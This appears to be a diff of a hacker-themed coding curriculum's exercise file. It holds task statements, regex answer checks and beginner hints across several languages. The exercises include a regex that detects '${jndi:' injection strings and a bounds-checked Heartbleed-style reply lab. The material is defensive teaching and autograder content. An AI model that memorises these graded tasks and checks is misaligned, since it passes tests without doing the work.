+  task: `Write <code>static List&lt;string&gt; FailIps(IEnumerable&lt;string&gt; lines)</code> using <code>Where</code>, <code>Select</code> and <code>ToList</code>, and <code>ByIp</code> using <code>GroupBy</code> and <code>ToDictionary</code>. Lines look like <code>"10.0.0.9 FAIL"</code>. <code>FailIps</code> returns the IP of every FAIL line in order, repeats included. <code>static Dictionary&lt;string, int&gt; ByIp(IEnumerable&lt;string&gt; lines)</code> counts every line per IP.`,
   starter: `// your code here\n`,
   checks: [[/\.Where\s*\(\s*\w+\s*=>/, ".Where(l => ...)"], [/\.Select\s*\(\s*\w+\s*=>/, ".Select(l => ...)"], [/\.ToList\s*\(\s*\)/, ".ToList()"], [/\.GroupBy\s*\(/, ".GroupBy(...)"], [/\.ToDictionary\s*\(/, ".ToDictionary(g => g.Key, g => g.Count())"]] },
 
@@ -2655,7 +2902,7 @@ static async Task&lt;int&gt; SweepAsync(string[] hosts, CancellationToken ct = d
 }
 using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(30));
 int up = await SweepAsync(["a", "b"], cts.Token);</pre><p>Avoid <code>async void</code> (except for event handlers) and never block with <code>.Result</code>.</p>`,
-  task: `Write <code>static async Task&lt;bool&gt; PingAsync(string host, CancellationToken ct)</code> using <code>await Task.Delay</code>, and <code>static async Task&lt;int&gt; SweepAsync(...)</code> using <code>Task.WhenAll</code>. Create a <code>CancellationTokenSource</code>.`,
+  task: `Write <code>static async Task&lt;bool&gt; PingAsync(string host, CancellationToken ct)</code> using <code>await Task.Delay</code>, and <code>static async Task&lt;int&gt; SweepAsync(...)</code> using <code>Task.WhenAll</code>. Create a <code>CancellationTokenSource</code>. <code>PingAsync</code> returns true when the host name isn't empty. Pass <code>ct</code> to <code>Task.Delay</code> so cancelling works. <code>static async Task&lt;int&gt; SweepAsync(IEnumerable&lt;string&gt; hosts, CancellationToken ct)</code> returns how many hosts answered true.`,
   starter: `// your code here\n`,
   checks: [[/static\s+async\s+Task<bool>\s+PingAsync\s*\(/, "static async Task<bool> PingAsync(...)"], [/await\s+Task\.Delay\s*\(/, "await Task.Delay(50, ct)"], [/static\s+async\s+Task<int>\s+SweepAsync/, "static async Task<int> SweepAsync(...)"], [/Task\.WhenAll\s*\(/, "await Task.WhenAll(...)"], [/CancellationTokenSource/, "new CancellationTokenSource(...)"]] },
 
@@ -2679,7 +2926,7 @@ public class SentryDrone : MonoBehaviour
 
 // Tests/DroneLogicTests.cs
 public class DroneLogicTests { [Fact] public void Clamps() =&gt; Assert.Equal(10, DroneLogic.Clamp(99, 0, 10)); }</pre>`,
-  task: `Write <code>class SentryDrone : MonoBehaviour</code> with <code>[SerializeField] private</code> fields, <code>Start</code> and <code>Update</code> methods that use <code>Time.deltaTime</code>, and an <code>event</code> invoked with <code>?.Invoke</code>. Add an xUnit test class with <code>[Fact]</code> and <code>Assert.Equal</code>.`,
+  task: `Write <code>class SentryDrone : MonoBehaviour</code> with <code>[SerializeField] private</code> fields, <code>Start</code> and <code>Update</code> methods that use <code>Time.deltaTime</code>, and an <code>event</code> invoked with <code>?.Invoke</code>. Add an xUnit test class with <code>[Fact]</code> and <code>Assert.Equal</code>. Give the drone a <code>[SerializeField] private Transform target</code> and a range field. In <code>Update</code>, when <code>Vector3.Distance(transform.position, target.position)</code> is less than the range, invoke an event such as <code>public event Action&lt;float&gt; TargetSpotted</code>.`,
   starter: `using UnityEngine;\nusing Xunit;\n\n// your code here\n`,
   checks: [[/class\s+\w+\s*:\s*MonoBehaviour/, "class SentryDrone : MonoBehaviour"], [/\[SerializeField\]\s*private/, "[SerializeField] private float speed"], [/void\s+Update\s*\(\s*\)/, "void Update()"], [/Time\.deltaTime/, "speed * Time.deltaTime"], [/\bevent\s+[\w.<>?]+\s+\w+/, "public event Action<int> OnHit"], [/\?\.Invoke\s*\(/, "OnHit?.Invoke(hits)"], [/\[Fact\]/, "[Fact]"], [/Assert\.Equal\s*\(/, "Assert.Equal(...)"]] }
 ]);
@@ -2701,7 +2948,7 @@ int main() {
     std::cout &lt;&lt; "Agent " &lt;&lt; handle &lt;&lt; " // level " &lt;&lt; level &lt;&lt; '\\n';
     return 0;
 }</pre><p>Compile with <code>g++ -std=c++23 -Wall -Wextra -O2 main.cpp</code>. Always initialize variables, because reading an uninitialized local is a classic bug (C++26 finally makes it defined "erroneous behavior").</p>`,
-  task: `Write <code>std::string intro(const std::string&amp; handle, int level)</code> that returns the formatted string, and an <code>int main()</code> that uses <code>auto</code>, <code>const</code> and <code>std::cout</code>.`,
+  task: `Write <code>std::string intro(const std::string&amp; handle, int level)</code> that returns the formatted string, and an <code>int main()</code> that uses <code>auto</code>, <code>const</code> and <code>std::cout</code>. <code>intro("neo", 3)</code> must return <code>"Agent neo // level 3"</code>.`,
   starter: `#include <iostream>\n#include <string>\n\n// your code here\n`,
   checks: [[/std::string\s+intro\s*\(\s*const\s+std::string\s*&\s*handle\s*,\s*int\s+level\s*\)/, "std::string intro(const std::string& handle, int level)"], [/int\s+main\s*\(/, "int main()"], [/\bauto\s+\w+\s*=/, "auto x = ..."], [/\bconst\s+/, "const ..."], [/std::cout\s*<</, "std::cout << ..."]] },
 
@@ -2722,7 +2969,7 @@ const char* name(Level l) {
     }
     return "?";
 }</pre><p>Prefer <code>enum class</code>, which is scoped and doesn't implicitly convert to <code>int</code>. Turn on <code>-Wswitch</code> to catch missing cases.</p>`,
-  task: `Define <code>enum class Level</code>, write <code>Level classify(int score)</code> with <code>if</code>/<code>else</code>, and <code>const char* name(Level l)</code> using <code>switch</code> over every enumerator.`,
+  task: `Define <code>enum class Level</code>, write <code>Level classify(int score)</code> with <code>if</code>/<code>else</code>, and <code>const char* name(Level l)</code> using <code>switch</code> over every enumerator. Use the thresholds 90, 60 and 30, and have <code>name</code> return <code>"CRITICAL"</code>, <code>"HIGH"</code>, <code>"MEDIUM"</code> or <code>"LOW"</code>.`,
   starter: `// your code here\n`,
   checks: [[/enum\s+class\s+Level/, "enum class Level { ... }"], [/Level\s+classify\s*\(\s*int\s+score\s*\)/, "Level classify(int score)"], [/switch\s*\(\s*\w+\s*\)/, "switch (l) { ... }"], [/case\s+Level::\w+\s*:/, "case Level::Critical:"]] },
 
@@ -2748,7 +2995,7 @@ int add(int a, int b);  double add(double a, double b);   // overloads
 auto square = [](int x) { return x * x; };
 int threshold = 80;
 auto hot = [threshold](int s) { return s &gt; threshold; };  // capture by value</pre><p>Rule of thumb: pass cheap types by value, large read-only types by <code>const&amp;</code>, and anything you need to modify by <code>&amp;</code>.</p>`,
-  task: `Write <code>std::size_t count_words(const std::string&amp; text)</code>, <code>void redact(std::string&amp; msg)</code>, <code>scan</code> with a default <code>port = 443</code>, and a lambda that captures a variable.`,
+  task: `Write <code>std::size_t count_words(const std::string&amp; text)</code>, <code>void redact(std::string&amp; msg)</code>, <code>scan</code> with a default <code>port = 443</code>, and a lambda that captures a variable. <code>count_words</code> counts words separated by any whitespace (blank text is 0). <code>redact</code> replaces the text with <code>"[REDACTED]"</code>. <code>scan</code> returns <code>"host:port"</code>.`,
   starter: `#include <string>\n#include <sstream>\n\n// your code here\n`,
   checks: [[/count_words\s*\(\s*const\s+std::string\s*&\s*\w+\s*\)/, "count_words(const std::string& text)"], [/void\s+redact\s*\(\s*std::string\s*&\s*\w+\s*\)/, "void redact(std::string& msg)"], [/int\s+port\s*=\s*443/, "int port = 443"], [/\[\s*[&=]?\s*\w+\s*\]\s*\(/, "lambda with capture [threshold](int s) { ... }"]] },
 
@@ -2768,7 +3015,7 @@ std::string caesar(std::string_view text, int shift) {
     return out;
 }
 std::string line = std::format("{:&lt;10}|{:&gt;5}", "core", 443);   // C++20</pre><p><code>string_view</code> is a non-owning view. Never return one that points into a temporary string.</p>`,
-  task: `Write <code>std::string caesar(std::string_view text, int shift)</code> using <code>reserve</code>, <code>std::isalpha</code> and <code>% 26</code>, and <code>bool is_private(std::string_view ip)</code> using <code>starts_with</code>.`,
+  task: `Write <code>std::string caesar(std::string_view text, int shift)</code> using <code>reserve</code>, <code>std::isalpha</code> and <code>% 26</code>, and <code>bool is_private(std::string_view ip)</code> using <code>starts_with</code>. <code>is_private</code> is true for addresses starting with <code>10.</code> or <code>192.168.</code>, and false for public ones like <code>8.8.8.8</code>.`,
   starter: `#include <string>\n#include <string_view>\n#include <cctype>\n\n// your code here\n`,
   checks: [[/std::string\s+caesar\s*\(\s*std::string_view\s+\w+\s*,\s*int\s+shift\s*\)/, "std::string caesar(std::string_view text, int shift)"], [/\.reserve\s*\(/, "out.reserve(text.size())"], [/std::isalpha|isalpha/, "std::isalpha(...)"], [/%\s*26/, "% 26"], [/\.starts_with\s*\(/, "ip.starts_with(\"10.\")"]] },
 
@@ -2792,7 +3039,7 @@ public:
 private:
     std::FILE* f_;
 };</pre><p>RAII is the central idea in C++: acquire a resource in the constructor and release it in the destructor. Most classes then need no special members at all (the "rule of zero").</p>`,
-  task: `Write <code>class Node</code> with an <code>explicit</code> constructor that uses a member initializer list, a <code>const</code> member function, and private members. Then write an RAII class with a destructor (<code>~</code>) and a deleted copy constructor.`,
+  task: `Write <code>class Node</code> with an <code>explicit</code> constructor that uses a member initializer list, a <code>const</code> member function, and private members. Then write an RAII class with a destructor (<code>~</code>) and a deleted copy constructor. Use <code>Node(std::string name, int strength)</code> with accessors <code>name()</code> and <code>strength()</code> that are marked <code>const</code>.`,
   starter: `#include <string>\n#include <cstdio>\n\n// your code here\n`,
   checks: [[/class\s+Node/, "class Node"], [/explicit\s+Node\s*\(/, "explicit Node(...)"], [/\)\s*:\s*\w+_?\s*\(/, "member init list : name_(std::move(name))"], [/\)\s*const\s*\{/, "bool hot() const { ... }"], [/~\w+\s*\(\s*\)/, "destructor ~LogFile()"], [/=\s*delete\s*;/, "LogFile(const LogFile&) = delete;"]] },
 
@@ -2807,7 +3054,7 @@ std::weak_ptr&lt;Node&gt; observer = shared;                  // doesn't extend 
 
 std::optional&lt;int&gt; parse_port(std::string_view s);    // maybe a value
 // C++23: std::expected&lt;int, std::string&gt; for value-or-error</pre><p>In modern C++ you should almost never write <code>new</code> or <code>delete</code> yourself.</p>`,
-  task: `Create a <code>std::unique_ptr</code> with <code>std::make_unique</code>, move it into a vector with <code>std::move</code>, and write <code>std::optional&lt;int&gt; parse_port(std::string_view s)</code> that returns <code>std::nullopt</code> on bad input. Don't use raw <code>new</code>.`,
+  task: `Create a <code>std::unique_ptr</code> with <code>std::make_unique</code>, move it into a vector with <code>std::move</code>, and write <code>std::optional&lt;int&gt; parse_port(std::string_view s)</code> that returns <code>std::nullopt</code> on bad input. Don't use raw <code>new</code>. Valid ports are whole numbers from 1 to 65535 with nothing after them, so <code>"http"</code>, <code>"0"</code>, <code>"70000"</code> and <code>"80abc"</code> all return <code>std::nullopt</code>.`,
   starter: `#include <memory>\n#include <optional>\n#include <string_view>\n#include <vector>\n\n// your code here\n`,
   checks: [[/std::make_unique\s*</, "std::make_unique<Node>(...)"], [/std::unique_ptr\s*</, "std::unique_ptr<Node>"], [/std::move\s*\(/, "std::move(node)"], [/std::optional<int>\s+parse_port/, "std::optional<int> parse_port(std::string_view s)"], [/std::nullopt/, "return std::nullopt;"], [/^(?![\s\S]*\bnew\s+\w)/, "no raw new"]] },
 
@@ -2822,7 +3069,7 @@ std::optional&lt;std::vector&lt;std::byte&gt;&gt; reply(std::span&lt;const std::
     auto slice = payload.first(claimed_len);
     return std::vector&lt;std::byte&gt;(slice.begin(), slice.end());
 }</pre><p>Use <code>.at()</code> or hardened standard libraries for checked access. Build with <code>-fsanitize=address,undefined</code> while testing. The NSA and CISA recommend memory-safe languages for new code, and this lab shows why.</p>`,
-  task: `Write a safe <code>reply</code> that takes a <code>std::span&lt;const std::byte&gt;</code> and a claimed length, <b>compares it against <code>payload.size()</code></b>, and returns <code>std::nullopt</code> when the claim is larger. Use <code>.first(</code> or <code>.subspan(</code>, and don't use <code>memcpy</code>.`,
+  task: `Write a safe <code>reply</code> that takes a <code>std::span&lt;const std::byte&gt;</code> and a claimed length, <b>compares it against <code>payload.size()</code></b>, and returns <code>std::nullopt</code> when the claim is larger. Use <code>.first(</code> or <code>.subspan(</code>, and don't use <code>memcpy</code>. Name it <code>std::optional&lt;std::vector&lt;std::byte&gt;&gt; heartbeat_reply(std::span&lt;const std::byte&gt; payload, std::size_t claimed)</code>. It returns the first <code>claimed</code> bytes, or <code>std::nullopt</code> when <code>claimed &gt; payload.size()</code>.`,
   starter: `#include <span>\n#include <optional>\n#include <vector>\n#include <cstddef>\n\n// your code here\n`,
   checks: [[/std::span\s*<\s*const\s+std::byte\s*>/, "std::span<const std::byte> payload"], [/\w+\s*>\s*payload\.size\(\)|payload\.size\(\)\s*<\s*\w+/, "if (claimed_len > payload.size())"], [/std::nullopt/, "return std::nullopt;"], [/\.first\s*\(|\.subspan\s*\(/, "payload.first(claimed_len)"], [/^(?![\s\S]*memcpy)/, "no memcpy"]] },
 
@@ -2876,7 +3123,7 @@ int sweep(const std::vector&lt;std::string&gt;&amp; hosts) {
     return up.load();
 }
 auto f = std::async(std::launch::async, [] { return ping("core"); });</pre><p>Data races are undefined behavior. Guard shared state with <code>std::mutex</code> or use <code>std::atomic</code>, and run ThreadSanitizer.</p>`,
-  task: `Write <code>int sweep(const std::vector&lt;std::string&gt;&amp; hosts)</code> using <code>std::thread</code> or <code>std::jthread</code>, a <code>std::atomic&lt;int&gt;</code> counter, and a <code>std::mutex</code> with <code>std::lock_guard</code>. Join every thread.`,
+  task: `Write <code>int sweep(const std::vector&lt;std::string&gt;&amp; hosts)</code> using <code>std::thread</code> or <code>std::jthread</code>, a <code>std::atomic&lt;int&gt;</code> counter, and a <code>std::mutex</code> with <code>std::lock_guard</code>. Join every thread. Every host counts as reachable, so <code>sweep</code> returns the number of hosts.`,
   starter: `#include <thread>\n#include <mutex>\n#include <atomic>\n#include <vector>\n#include <string>\n#include <iostream>\n\nbool ping(const std::string&) { return true; }\n\n// your code here\n`,
   checks: [[/std::(j)?thread/, "std::jthread / std::thread"], [/std::atomic\s*<\s*int\s*>/, "std::atomic<int> up{0}"], [/std::mutex/, "std::mutex"], [/std::(lock_guard|scoped_lock|unique_lock)/, "std::lock_guard lock(mu)"], [/\.join\s*\(\s*\)|jthread|\.clear\s*\(\s*\)/, "join all threads"]] },
 
@@ -2907,6 +3154,1292 @@ TEST(Buffer, ThrowsOutOfRange) { Buffer b(4); EXPECT_THROW(b.at(4), std::out_of_
 ]);
 
 """##,
+    // web/curriculum/_steps.js
+    ##"""
+// ROOT//ACCESS step-by-step instructions. One list per mission id, written for someone seeing the concept for the first time.
+// Each step is one small action. The hint ladder (curriculum/_guide.js) points learners back to these steps.
+(function (g) {
+  const RA = g.RA = g.RA || {};
+  RA.STEPS = Object.assign(RA.STEPS || {}, {
+  // ---------------- Python ----------------
+  py1: [
+    "Find the line <code>def intro(handle, level):</code>. That line names the function and its two inputs. Leave it exactly as it is.",
+    "Delete the <code>pass</code> line. <code>pass</code> means \"do nothing\", which is why the starter fails.",
+    "On the indented line underneath, type <code>return</code> followed by a space. Everything after <code>return</code> is what the function hands back.",
+    "After <code>return</code>, build the text with an f-string: put <code>f</code> right before the opening quote, then write <code>Agent {handle} // level {level}</code> inside the quotes. The curly braces swap in the real values.",
+    "Check the spacing against the example: <code>intro(\"neo\", 3)</code> must give exactly <code>\"Agent neo // level 3\"</code>, with one space either side of <code>//</code>.",
+    "Run the checkpoints. If one fails, compare the \"got\" text with the \"want\" text one character at a time."
+  ],
+  py2: [
+    "Keep <code>def threat_level(score):</code> and remove <code>pass</code>.",
+    "Write <code>if score >= 90:</code> and on the next, further-indented line <code>return \"CRITICAL\"</code>.",
+    "Add <code>elif score >= 60:</code> returning <code>\"HIGH\"</code>, then <code>elif score >= 30:</code> returning <code>\"MEDIUM\"</code>. Python checks these top to bottom and stops at the first true one, so the order matters.",
+    "Finish with <code>else:</code> (or just a final line) that returns <code>\"LOW\"</code>.",
+    "Test the edges in your head: 90 must be CRITICAL, 59 must be MEDIUM, 0 must be LOW."
+  ],
+  py3: [
+    "Each line is two words, like <code>\"10.0.0.9 FAIL\"</code>. <code>line.split()</code> turns it into <code>[\"10.0.0.9\", \"FAIL\"]</code>, so the IP is at index 0 and the status is at index 1.",
+    "Build a set of IPs from the FAIL lines: <code>{line.split()[0] for line in logs if line.split()[1] == \"FAIL\"}</code>. A set throws away duplicates for you.",
+    "Wrap it in <code>sorted(...)</code>, which turns the set into a sorted list.",
+    "<code>return</code> that sorted list. An empty <code>logs</code> list should give back <code>[]</code>, and this approach already handles it."
+  ],
+  py4: [
+    "Inside <code>make_counter</code>, create a variable to hold the count: <code>count = start</code>.",
+    "Still inside <code>make_counter</code>, define an inner function, for example <code>def tick():</code>.",
+    "As the first line of <code>tick</code>, write <code>nonlocal count</code>. This tells Python you want to change the outer <code>count</code>, not make a new one.",
+    "In <code>tick</code>, add 1 with <code>count += 1</code>, then <code>return count</code>.",
+    "Back in <code>make_counter</code> (one indent level out), write <code>return tick</code>, without parentheses. You're handing back the function itself, not calling it.",
+    "Each call to <code>make_counter()</code> creates its own private <code>count</code>, so two counters never share a number."
+  ],
+  py5: [
+    "Loop over every character: <code>for ch in text:</code>.",
+    "If it isn't a letter (<code>not ch.isalpha()</code>), append it to <code>out</code> unchanged.",
+    "For letters, pick the starting code: <code>base = ord(\"A\")</code> for uppercase and <code>ord(\"a\")</code> for lowercase. <code>ord</code> turns a character into a number.",
+    "Shift and wrap: <code>(ord(ch) - base + shift) % 26 + base</code>. The <code>% 26</code> wraps z back round to a.",
+    "Turn the number back into a character with <code>chr(...)</code> and append it to <code>out</code>.",
+    "The starter already ends with <code>return \"\".join(out)</code>, which glues the list back into one string. Keep it."
+  ],
+  py6: [
+    "Keep the import line, then write <code>@dataclass</code> on its own line directly above the class.",
+    "Write <code>class Node:</code> with two indented fields: <code>name: str</code> and <code>strength: int = 0</code>.",
+    "Add a method <code>def boost(self, n):</code>. Inside it, do <code>self.strength += n</code> and then <code>return self.strength</code>.",
+    "Add <code>def __str__(self):</code> returning <code>f\"{self.name}({self.strength})\"</code>. Python calls this when you write <code>str(node)</code>.",
+    "Make sure both methods are indented inside the class, at the same level as the fields."
+  ],
+  py7: [
+    "Define your own error type: <code>class AccessDenied(Exception):</code> with <code>pass</code> as its body.",
+    "Write <code>def unlock(code):</code>. If <code>code == \"0451\"</code>, return <code>\"OPEN\"</code>.",
+    "Otherwise <code>raise AccessDenied(\"bad code\")</code>. Raising stops the function and sends the error up to whoever called it.",
+    "Write <code>def safe_unlock(code):</code> with a <code>try:</code> block that does <code>return unlock(code)</code>.",
+    "Underneath, add <code>except AccessDenied:</code> and <code>return \"DENIED\"</code>. Catch only this error type, not every possible error."
+  ],
+  py8: [
+    "At the top, add <code>from collections import Counter</code> and <code>import json</code>.",
+    "In <code>top_words</code>, lowercase and split the text: <code>text.lower().split()</code> gives you a list of words.",
+    "Pass that list to <code>Counter(...)</code>, then call <code>.most_common(n)</code> on it and return the result.",
+    "In <code>to_json</code>, call your own <code>top_words(text, n)</code>, wrap it in <code>dict(...)</code>, then return <code>json.dumps(...)</code> of that dict."
+  ],
+  py9: [
+    "Write <code>def chunks(seq, size):</code> and loop over start positions: <code>for i in range(0, len(seq), size):</code>.",
+    "Inside the loop, <code>yield list(seq[i:i + size])</code>. <code>yield</code> hands out one chunk at a time instead of building everything up front.",
+    "Add <code>import functools</code> at the top, then write <code>def shout(fn):</code>.",
+    "Inside <code>shout</code>, decorate an inner function with <code>@functools.wraps(fn)</code> and define <code>def wrapper(*args, **kwargs):</code>.",
+    "Have <code>wrapper</code> return <code>fn(*args, **kwargs).upper()</code>, then end <code>shout</code> with <code>return wrapper</code>."
+  ],
+  py10: [
+    "Add <code>import asyncio</code> at the top.",
+    "Write <code>async def ping(host):</code>. Inside it, <code>await asyncio.sleep(0)</code> and then <code>return f\"{host}:ok\"</code>.",
+    "Write <code>async def sweep(hosts):</code>.",
+    "Make one ping per host and run them together: <code>await asyncio.gather(*(ping(h) for h in hosts))</code>. The <code>*</code> spreads them out as separate arguments.",
+    "Wrap the result in <code>list(...)</code> and return it. Results come back in the same order as <code>hosts</code>."
+  ],
+  py11: [
+    "Write the signature with type hints: <code>def is_valid_ip(s: str) -> bool:</code>.",
+    "Split on dots: <code>parts = s.split(\".\")</code>. If <code>len(parts) != 4</code>, return <code>False</code>.",
+    "Loop over the parts. Return <code>False</code> if a part isn't all digits (<code>not p.isdigit()</code>). That also catches empty parts.",
+    "Also return <code>False</code> for a leading zero (<code>len(p) > 1 and p[0] == \"0\"</code>) or a number over 255 (<code>int(p) > 255</code>).",
+    "If the loop finishes without rejecting anything, return <code>True</code>."
+  ],
+  py12: [
+    "Import <code>Counter</code> and <code>dataclass</code>, and paste in your <code>is_valid_ip</code> from rank 11.",
+    "Define <code>@dataclass class Summary:</code> with fields <code>total: int</code>, <code>fails: int</code> and <code>top_ip: str | None</code>.",
+    "In <code>analyze(lines)</code>, start <code>total = 0</code> and <code>fail_counts = Counter()</code>.",
+    "Loop over the lines and split each one. Skip it with <code>continue</code> if it doesn't have exactly 2 parts or the IP is invalid.",
+    "For every valid line, add 1 to <code>total</code>. If the status is <code>\"FAIL\"</code>, add 1 to <code>fail_counts[ip]</code>.",
+    "Use <code>fail_counts.most_common(1)</code> to find the top IP, or <code>None</code> if there are no fails. Return <code>Summary(total, sum(fail_counts.values()), top_ip)</code>."
+  ],
+
+  // ---------------- JavaScript ----------------
+  js1: [
+    "Write <code>function intro(handle, level) {</code> and close it with <code>}</code>.",
+    "Inside, use <code>return</code> with a template literal, which is text in backticks (<code>`</code>) rather than quotes.",
+    "Write <code>`Agent ${handle} // level ${level}`</code>. Each <code>${...}</code> swaps in a value.",
+    "Run it. <code>intro(\"neo\", 3)</code> should give exactly <code>\"Agent neo // level 3\"</code>."
+  ],
+  js2: [
+    "Write <code>function threatLevel(score) { ... }</code>.",
+    "Check the highest band first: <code>if (score >= 90) return \"CRITICAL\";</code>",
+    "Then <code>if (score >= 60) return \"HIGH\";</code> and <code>if (score >= 30) return \"MEDIUM\";</code>",
+    "End with <code>return \"LOW\";</code> for everything else. Because each <code>return</code> leaves the function, the order does the work."
+  ],
+  js3: [
+    "Each host is an object like <code>{ name: \"db1\", patched: false }</code>.",
+    "Keep only the unpatched ones: <code>hosts.filter(h => !h.patched)</code>. <code>!</code> means \"not\".",
+    "Turn each host into its name: <code>.map(h => h.name)</code>.",
+    "Sort the names alphabetically with <code>.sort()</code> and return the result. You can chain all three on one line."
+  ],
+  js4: [
+    "Write <code>function makeCounter(start = 0) {</code>. The <code>= 0</code> is the default used when no start is given.",
+    "Inside it, make a variable that can change: <code>let count = start;</code>",
+    "Return a new function: <code>return function () { count += 1; return count; };</code> (an arrow function <code>() => ++count</code> works too).",
+    "The inner function keeps access to <code>count</code> after <code>makeCounter</code> finishes. That's a closure, and each counter gets its own <code>count</code>."
+  ],
+  js5: [
+    "Write <code>function isMalicious(input) { ... }</code>.",
+    "Build a regular expression that matches <code>${</code>, optional spaces, then <code>jndi:</code>: <code>/\\$\\{\\s*jndi:/i</code>.",
+    "<code>\\$</code> and <code>\\{</code> escape characters that have special meaning in a regex, <code>\\s*</code> means \"any number of spaces\", and the <code>i</code> flag ignores case.",
+    "Return <code>regex.test(input)</code>, which gives <code>true</code> or <code>false</code>."
+  ],
+  js6: [
+    "Write <code>class Node {</code> with <code>constructor(name) { this.name = name; this.strength = 0; }</code>",
+    "Add <code>boost(n) { this.strength += n; return this.strength; }</code>",
+    "Add a getter: <code>get label() { return `${this.name}(${this.strength})`; }</code>. You read it as <code>node.label</code>, without parentheses.",
+    "Write <code>class Relay extends Node {</code> with <code>boost(n) { return super.boost(n * 2); }</code>. <code>super</code> calls the parent's version."
+  ],
+  js7: [
+    "Write <code>class AccessDenied extends Error {}</code>. It's a new kind of error you can catch on its own.",
+    "Write <code>function unlock(code) {</code>. If <code>code === \"0451\"</code>, return <code>\"OPEN\"</code>.",
+    "Otherwise <code>throw new AccessDenied(\"bad code\");</code>",
+    "Write <code>function safeUnlock(code) {</code> with <code>try { return unlock(code); }</code>.",
+    "Add <code>catch (e) { if (e instanceof AccessDenied) return \"DENIED\"; throw e; }</code>. That handles only your error and passes any other error on."
+  ],
+  js8: [
+    "In <code>tally(items)</code>, create <code>const m = new Map();</code>",
+    "Loop: <code>for (const x of items) m.set(x, (m.get(x) ?? 0) + 1);</code>. <code>??</code> uses 0 when the item isn't in the map yet.",
+    "Return <code>Object.fromEntries(m)</code> to turn the Map into a plain object.",
+    "In <code>topN(items, n)</code>, take <code>Object.entries(tally(items))</code>, sort with <code>(a, b) => b[1] - a[1]</code> (biggest count first), then <code>.slice(0, n)</code>."
+  ],
+  js9: [
+    "Write <code>function* chunks(arr, size) {</code>. The <code>*</code> makes it a generator.",
+    "Loop <code>for (let i = 0; i < arr.length; i += size)</code> and <code>yield arr.slice(i, i + size);</code>",
+    "Write <code>function* take(iter, n) {</code>. If <code>n <= 0</code>, return straight away.",
+    "Loop <code>for (const v of iter)</code>: <code>yield v</code>, count it, and <code>return</code> once you've yielded <code>n</code> values."
+  ],
+  js10: [
+    "Write <code>async function sweep(hosts, ping) {</code>.",
+    "Start every ping at once: <code>const results = await Promise.allSettled(hosts.map(h => ping(h)));</code>",
+    "Each result has <code>status</code> set to <code>\"fulfilled\"</code> or <code>\"rejected\"</code>. Treat fulfilled results as up and rejected ones as down.",
+    "Loop over the results by index, push <code>hosts[i]</code> into <code>up</code> or <code>down</code>, and return <code>{ up, down }</code>."
+  ],
+  js11: [
+    "Start with the easy case: <code>if (a === b) return true;</code>",
+    "If either value is <code>null</code> or isn't an object, return <code>false</code>. Remember that <code>typeof null</code> is <code>\"object\"</code>, so check null on its own.",
+    "If one is an array and the other isn't, return <code>false</code>. For two arrays, compare lengths, then call <code>deepEqual</code> on each pair of elements.",
+    "For objects, compare <code>Object.keys</code> lengths, then check every key with <code>deepEqual(a[k], b[k])</code>.",
+    "Calling <code>deepEqual</code> inside itself is called recursion. It lets the function handle objects nested to any depth."
+  ],
+  js12: [
+    "Write <code>async function analyze(source) {</code> and get the lines with <code>const lines = await source();</code>",
+    "Set up counters <code>total</code>, <code>skipped</code> and <code>fails</code>, plus a <code>Map</code> of fail counts per IP.",
+    "For each line, split on whitespace. If it isn't exactly 2 parts, or the IP isn't four numbers from 0 to 255, add 1 to <code>skipped</code> and <code>continue</code>.",
+    "For valid lines, add 1 to <code>total</code>. If the status is <code>\"FAIL\"</code>, add 1 to <code>fails</code> and to that IP's count in the map.",
+    "Find the IP with the highest count (starting from <code>null</code>), then return <code>{ total, fails, topIp, skipped }</code>."
+  ],
+
+  // ---------------- TypeScript ----------------
+  ts1: [
+    "Write the signature with types: <code>function intro(handle: string, level: number): string {</code>",
+    "The <code>: string</code> after the parentheses is the return type, so TypeScript checks that you really return text.",
+    "Return a template literal: <code>return `Agent ${handle} // level ${level}`;</code>",
+    "If the compiler complains, read which line it points to. Type errors show up before the code ever runs."
+  ],
+  ts2: [
+    "Declare the allowed values: <code>type Level = \"LOW\" | \"MEDIUM\" | \"HIGH\" | \"CRITICAL\";</code>",
+    "Write <code>function threatLevel(score: number): Level {</code>",
+    "Return <code>\"CRITICAL\"</code> for 90 and above, <code>\"HIGH\"</code> for 60 and above, <code>\"MEDIUM\"</code> for 30 and above, and <code>\"LOW\"</code> otherwise.",
+    "Try a typo such as <code>\"CRITCAL\"</code>: the compiler rejects it because it isn't part of <code>Level</code>. That's the point of this rank."
+  ],
+  ts3: [
+    "Write <code>function tally(items: string[]): Record&lt;string, number&gt; {</code> and start with <code>const out: Record&lt;string, number&gt; = {};</code>",
+    "Loop over the items and do <code>out[x] = (out[x] ?? 0) + 1;</code>, then return <code>out</code>.",
+    "Write <code>function top(items: string[]): [string, number] | undefined {</code>. If <code>items</code> is empty, return <code>undefined</code>.",
+    "Otherwise sort <code>Object.entries(tally(items))</code> by count, biggest first, and return the first entry as a <code>[string, number]</code> tuple."
+  ],
+  ts4: [
+    "Declare <code>interface Report { readonly id: number; source: string; verified?: boolean; }</code>",
+    "<code>readonly</code> means the field can't be reassigned, and <code>?</code> means it may be missing.",
+    "Write <code>function summarize(r: Report): string {</code>",
+    "Return <code>`#${r.id} from ${r.source} ${r.verified === true ? \"[verified]\" : \"[unverified]\"}`</code>. A missing field counts as unverified."
+  ],
+  ts5: [
+    "Declare a function type: <code>type Predicate&lt;T&gt; = (x: T) =&gt; boolean;</code>. <code>T</code> stands in for any type.",
+    "Write <code>function where&lt;T&gt;(items: T[], p: Predicate&lt;T&gt;): T[] { return items.filter(p); }</code>",
+    "Write <code>function not&lt;T&gt;(p: Predicate&lt;T&gt;): Predicate&lt;T&gt; {</code>",
+    "Return a new function that flips the answer: <code>return (x) =&gt; !p(x);</code>"
+  ],
+  ts6: [
+    "Write <code>class Vault {</code> with a field <code>private secrets = new Map&lt;string, string&gt;();</code>",
+    "Add <code>constructor(private readonly owner: string) {}</code>. Putting the modifier in the parameter list creates the field for you.",
+    "Add <code>store(k: string, v: string): void { this.secrets.set(k, v); }</code> and <code>read(k: string): string | undefined { return this.secrets.get(k); }</code>",
+    "Add <code>get size(): number { return this.secrets.size; }</code> and <code>describe(): string</code> returning <code>`${this.owner}: ${this.size} secrets`</code>."
+  ],
+  ts7: [
+    "<code>keyof T</code> means \"one of T's property names\", and <code>T[K]</code> means \"the type of that property\".",
+    "Write <code>function pluck&lt;T, K extends keyof T&gt;(items: T[], key: K): T[K][] { return items.map(x =&gt; x[key]); }</code>",
+    "Write <code>function indexBy&lt;T, K extends keyof T&gt;(items: T[], key: K): Map&lt;T[K], T&gt; {</code>",
